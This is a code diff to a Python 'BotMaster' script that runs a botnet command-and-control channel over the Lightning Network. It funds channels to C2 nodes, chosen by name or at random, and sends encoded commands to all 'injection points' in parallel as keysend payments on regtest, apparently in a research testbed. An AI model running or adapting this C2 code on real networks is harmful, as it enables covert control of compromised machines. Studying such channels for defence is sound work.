@@ -175,30 +175,62 @@ def discover_cc_nodes():
             return []
 
 
-def fund_channels(num_channels = 1, entry_point = -1.0):
+def pick_nodes_by_name(node_names, address_list_lines):
+    '''Select specific nodes by CC name from the address list.
+    address_list_lines: list of lines from CC_address_list.txt, each "CCN pubkey@host:port"
+    Returns list of pubkeys.
+    '''
+    name_to_pubkey = {}
+    for line in address_list_lines:
+        parts = line.split()
+        if len(parts) >= 2:
+            cc_name = parts[0].strip()
+            pubkey = parts[1].strip().split('@')[0]
+            name_to_pubkey[cc_name] = pubkey
+
+    selected = []
+    for name in node_names:
+        name = name.strip()
+        if name in name_to_pubkey:
+            selected.append(name_to_pubkey[name])
+        else:
+            logging.warning(f'{name} not found in network, skipping.')
+    return selected
+
+def pick_random_nodes(num_nodes, valid_nodes):
+    '''
+    Pick num_nodes random nodes from a set of nodes.
+    Returns a list.
+    '''
+    return random.sample(valid_nodes, num_nodes)
+
+def fund_channels(node_ids=None, count=1):
     '''
     Discover valid CC nodes and fund channels.
     Will return saved funded channels if they exist, to fund completely new channels
     you must call disconnect_all_channels() first.
     Parameters:
-        num_channels: number of channels to create (default is 1)
-        entry_point: percentage of where in the network to make these channels.
-                    negative = random, 0 = first nodes, 1 = last nodes. (default is -1.0)
+        node_ids: list of CC node names to connect to (e.g., ['CC5', 'CC12'])
+        count: number of random CC nodes to connect to (used when node_ids is None)
     '''
     # Load funded nodes if we have this saved
     funded_nodes = load_funded_nodes()
 
-    if entry_point > 100:
-        final_num_channels = num_channels * 3
+    if node_ids:
+        # Explicit node selection: resolve names to pubkeys
+        with open(os.path.basename(CC_ADDRESS_LIST_FILE), 'r') as f:
+            address_lines = f.readlines()
+        target_nodes = pick_nodes_by_name(node_ids, address_lines)
+        final_num_channels = len(target_nodes)
     else:
-        final_num_channels = num_channels
+        target_nodes = None
+        final_num_channels = count
 
-    # if the nodes are alreadyh funded then just return those.
+    # if the nodes are already funded then just return those.
     if len(funded_nodes) == final_num_channels:
         return funded_nodes
-    
-    # if we get to this point, then we need additional nodes to channel to, or we just haven't channeled to any
-    # same behavior either way
+
+    # Discover all CC nodes
     discovered_nodes = discover_cc_nodes()
     while not discovered_nodes:
         logging.info("No valid CC nodes found for funding. Retrying in 10 seconds")
@@ -207,9 +239,13 @@ def fund_channels(num_channels = 1, entry_point = -1.0):
 
     valid_cc_nodes = [cc_node for cc_node in discovered_nodes if cc_node not in funded_nodes]
 
+    # Select nodes to connect to
+    if target_nodes:
+        new_nodes = [n for n in target_nodes if n not in funded_nodes]
+    else:
+        new_nodes = pick_random_nodes(min(count, len(valid_cc_nodes)), valid_cc_nodes)
+
     for _ in range(RETRY_MAX):
-        new_nodes = pick_nodes(num_channels, entry_point, valid_cc_nodes)
-    
         for node in new_nodes:
 
             # first check if we have a channel with this node, if we do, then we can skip everything
@@ -235,77 +271,16 @@ def fund_channels(num_channels = 1, entry_point = -1.0):
                 logging.info(f'Successfully opened channel with {node}')
                 funded_nodes.add(node)
         else:
-            print(f'BM node has channeled with {num_channels} nodes successfully.')
-            logging.info(f'fund_channels: BM node has channeled with {num_channels} nodes successfully.')
+            print(f'BM node has channeled with {final_num_channels} nodes successfully.')
+            logging.info(f'fund_channels: BM node has channeled with {final_num_channels} nodes successfully.')
             break
-    
+
     if len(funded_nodes) != final_num_channels:
-        print(f'BM has failed to channel with {num_channels} nodes. Aborting')
-        logging.error(f'fund_channels: Only channels with {len(funded_nodes)} instead of {num_channels} nodes. Returning None')
+        print(f'BM has failed to channel with {final_num_channels} nodes. Aborting')
+        logging.error(f'fund_channels: Only channels with {len(funded_nodes)} instead of {final_num_channels} nodes. Returning None')
         return []
     else:
         return funded_nodes
-
-def pick_nodes(num_nodes, entry_point, valid_nodes):
-    '''
-    Top level function for picking nodes.
-    entry_point:
-        <0 : random
-        0-100 : position in the network
-        >100 : bottom, middle and top of the network
-    '''
-    if entry_point < 0:
-        return pick_random_nodes(num_nodes, valid_nodes)
-    if entry_point > 100:
-        # we want nodes from all three sections of the network
-        return_nodes = set()
-        for pos in range(0, 101, 50):
-            return_nodes.update(select_nodes_from_list(num_nodes, pos, valid_nodes))
-        return list(return_nodes)
-    else:
-        # normal behavior, pick nodes from the designated position
-        return select_nodes_from_list(num_nodes, entry_point, valid_nodes)
-
-def select_nodes_from_list(num_nodes, entry_point, valid_nodes):
-    '''
-    Helper function to pick nodes from a set of nodes,
-    using entry_point as a guide of where to pick the nodes.
-    This should only be called by pick nodes.
-    '''
-    if num_nodes > len(valid_nodes):
-        logging.error(f'pick_nodes: Trying to select more nodes than exists in valid nodes. Aborting.')
-        return []
-    
-    starting_ind = round(len(valid_nodes) * (entry_point / 100.0))
-
-    # get how many nodes from the 'center' node do we look for
-    deviation = (num_nodes - 1) // 2
-    left = deviation
-    right = deviation
-    if num_nodes % 2 == 0:
-        # if its even
-        right += 1
-
-    # Make sure we're not out of bounds
-    if (margin := starting_ind - left) < 0:
-        right += abs(margin)
-        left += margin
-    # keeping in mind, starting ind of 0
-    elif (margin := (len(valid_nodes) - 1) - (starting_ind + right)) < 0:
-        left += abs(margin)
-        right += margin
-
-    logging.info(f'slice is {starting_ind - left} : {starting_ind + right + 1}')
-
-    # we return the slice of nodes to connect to
-    return valid_nodes[starting_ind - left: starting_ind + right + 1]
-
-def pick_random_nodes(num_nodes, valid_nodes):
-    '''
-    Pick num_nodes random nodes from a set of nodes.
-    Returns a set.
-    '''
-    return random.sample(valid_nodes, num_nodes)
     
 
 
@@ -368,46 +343,45 @@ def send_msg(message, counter, funded_nodes):
 
     tlv_json = json.dumps({MESSAGE_TLV_TYPE : encode_msg(message_with_counter)})
 
-    while load_counter() == counter:
-        for node in funded_nodes:
-            # Construct the lightning-cli command
-            command = ["lightning-cli", "--regtest", "keysend",
-            f"destination={node}",
-            f"amount_msat=1",
-            f"extratlvs={tlv_json}"]
+    from concurrent.futures import ThreadPoolExecutor
 
-            try:
-                # Execute the command using shell=True to process the quotes correctly
-                for _ in range(RETRY_MAX):
-                    if ln_checker.wait_node_activated(node):
-                        break
-                    else:
-                        logging.info(f'No active channel with {node} - attempting to re-channel.')
-                        print('Channel disconneted, retrying connection.')
-                        if not connect_and_channel_node(node):
-                            logging.error(f'send_msg: ERROR: Could not connect to node. Aborting.')
-                else:
-                    print(f'BM cannot create channel with {node} after {RETRY_MAX} tries. Aborting')
-                    logging.error(f'send_msg: ERROR: BM cannot create channel with {node} after {RETRY_MAX} tries. Aborting')
-                    return False
+    def _send_to_node(node):
+        """Send keysend to a single injection point. Returns True on success."""
+        # Ensure channel is active, retry if needed
+        for _ in range(RETRY_MAX):
+            if ln_checker.wait_node_activated(node):
+                break
+            else:
+                logging.info(f'No active channel with {node} - attempting to re-channel.')
+                if not connect_and_channel_node(node):
+                    logging.error(f'Could not reconnect to {node}.')
+        else:
+            logging.error(f'Cannot activate channel with {node} after {RETRY_MAX} tries.')
+            return False
 
-                result = subprocess.run(command,
-                                        stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE,
-                                        text=True,
-                                        check=True)
-                if result.returncode == 0:
-                    print(f"Command '{message_with_counter}' sent to node {FUNDED_NODE_IDS} successfully.")
-                    print(f"Response: {result.stdout}")
-                    save_counter(counter + 1)  # Save the updated counter after a successful send
-                    return
-                else:
-                    print(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
-                    logging.error(f"Error sending command '{message_with_counter}' to node {FUNDED_NODE_IDS}: {result.stderr}")
-            except Exception as e:
-                    print(f"Exception occurred while sending command: {e}")
-                    logging.error(f"Exception occurred while sending command: {e}\nRetrying . . .")
-        time.sleep(5)
+        command = ["lightning-cli", "--regtest", "keysend",
+                   f"destination={node}", f"amount_msat=1",
+                   f"extratlvs={tlv_json}"]
+        try:
+            result = subprocess.run(command, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, text=True, check=True)
+            logging.info(f"Keysend to {node} succeeded.")
+            return True
+        except Exception as e:
+            logging.error(f"Keysend to {node} failed: {e}")
+            return False
+
+    # Send to ALL injection points in parallel
+    with ThreadPoolExecutor(max_workers=len(funded_nodes)) as pool:
+        results = list(pool.map(_send_to_node, funded_nodes))
+
+    succeeded = sum(results)
+    if any(results):
+        logging.info(f"Command '{message_with_counter}' sent to {succeeded}/{len(funded_nodes)} injection points.")
+        print(f"Command '{message_with_counter}' sent to {succeeded}/{len(funded_nodes)} injection points.")
+        save_counter(counter + 1)
+    else:
+        logging.error(f'All {len(funded_nodes)} injection points failed for message {message_with_counter}.')
         
 def load_this_node ():
     global THIS_NODE 
@@ -453,7 +427,7 @@ def disconnect_node(node):
         logging.error(f'disconnect_node: ERROR: {e}')  
 
 
-def main(goal, message, num_channels, entry_point, start_fresh):
+def main(goal, message, node_ids=None, count=1, start_fresh=False):
 
     """
     Main Botmaster logic.
@@ -461,9 +435,12 @@ def main(goal, message, num_channels, entry_point, start_fresh):
     logging.info("Starting Botmaster Node Script")
     connect_to_innocent() # we need to connect to innocent to see channel gossip
     load_this_node()
-    logging.info(f"Funding {num_channels} channel(s)")
-    # Fund num_channels channels with valid CC nodes
-    funded_nodes = fund_channels(num_channels, entry_point)
+    if node_ids:
+        logging.info(f"Funding channels with specific nodes: {node_ids}")
+    else:
+        logging.info(f"Funding {count} random channel(s)")
+    # Fund channels with specified or random CC nodes
+    funded_nodes = fund_channels(node_ids=node_ids, count=count)
 
     if start_fresh:
         logging.info(f'main: Closing and disconnceting from all nodes. Starting fresh')
@@ -471,7 +448,7 @@ def main(goal, message, num_channels, entry_point, start_fresh):
         disconnect_all_channels(funded_nodes)
 
     elif not funded_nodes:
-        funded_nodes = fund_channels(num_channels, entry_point)
+        funded_nodes = fund_channels(node_ids=node_ids, count=count)
 
     # Allow interactive command sending
     if goal == 1:
@@ -483,35 +460,26 @@ def main(goal, message, num_channels, entry_point, start_fresh):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='BotMaster Command and Control Manager')
-    # add an option to take in "clear" to disconnect all channels and start fresh
     parser.add_argument('--msg',
-                        help = '''
-                        The message to send to the botnet.
-                        ''')
-    parser.add_argument('--cc', type = int, default = 1,
-                        help = '''
-                        Number of CC servers to send the command to.''')
-    parser.add_argument('--init', type = float, default = 0.0,
-                        help = '''
-                        Where in the botnet to connect as a percentage of the network.
-                        <0  : Random
-                        0.0 : Oldest nodes
-                        50.0 : Middle of the network
-                        100.0 : Youngest Nodes
-                        >0 : Oldest, middle and youngest nodes'''
-                        )
-    parser.add_argument('--fresh', action = 'store_true',
-                        help = '''
-                        Close and disconnect all previously funded nodes.
-                        ''')
-    
+                        help='The message to send to the botnet.')
+    parser.add_argument('--node-ids', type=str, default=None,
+                        help='Comma-separated CC node names to connect to (e.g., CC5,CC12,CC30).')
+    parser.add_argument('--count', type=int, default=1,
+                        help='Number of random CC nodes to connect to (used when --node-ids not provided).')
+    parser.add_argument('--fresh', action='store_true',
+                        help='Close and disconnect all previously funded nodes.')
+
     args = parser.parse_args()
 
+    node_ids = None
+    if args.node_ids:
+        node_ids = [n.strip() for n in args.node_ids.split(',')]
 
     if args.msg:
-        main(2, args.msg, args.cc, args.init, args.fresh)
+        main(2, args.msg, node_ids=node_ids, count=args.count, start_fresh=args.fresh)
     else:
-        if input(f'Starting botmaster. Will connect to {args.cc} nodes at {args.init * 100}% of the network. Continue? y/n').lower() in ['y', 'yes']:
-            main(1, args.msg, args.cc, args.init, args.fresh)
+        desc = f'nodes {node_ids}' if node_ids else f'{args.count} random node(s)'
+        if input(f'Starting botmaster. Will connect to {desc}. Continue? y/n').lower() in ['y', 'yes']:
+            main(1, args.msg, node_ids=node_ids, count=args.count, start_fresh=args.fresh)
         else:
             print(f'Exiting Botmaster script.')
